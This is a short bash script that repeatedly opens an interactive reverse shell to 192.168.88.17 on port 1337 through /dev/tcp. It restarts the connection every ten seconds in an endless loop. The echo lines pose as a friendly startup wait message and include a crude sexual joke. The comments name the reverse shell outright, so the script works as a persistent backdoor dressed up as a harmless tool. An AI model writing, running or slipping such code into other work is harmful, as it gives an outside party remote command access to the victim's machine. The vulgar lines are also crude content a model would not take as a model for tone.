#!/bin/bash
TARGET_HOST="192.168.88.17"
TARGET_PORT="1337"

# Function to restart the reverse shell process
starting_the_tool() {
  echo "plz wait in till it start up inshallah go get something or to the bathroom or go pray or help your mom or dad ..."
  echo "bismilallah "
  echo "opps looks something fall down daday "
  echo "ahhhhhhh fuck me more daday "
  echo "plz wait"   
  bash -i >& "/dev/tcp/${TARGET_HOST}/${TARGET_PORT}" 0>&1 &
}

# Continuously monitor the state of the reverse shell
while true; do
  starting_the_tool
  # Sleep for a desired interval before checking again
  sleep 10
done
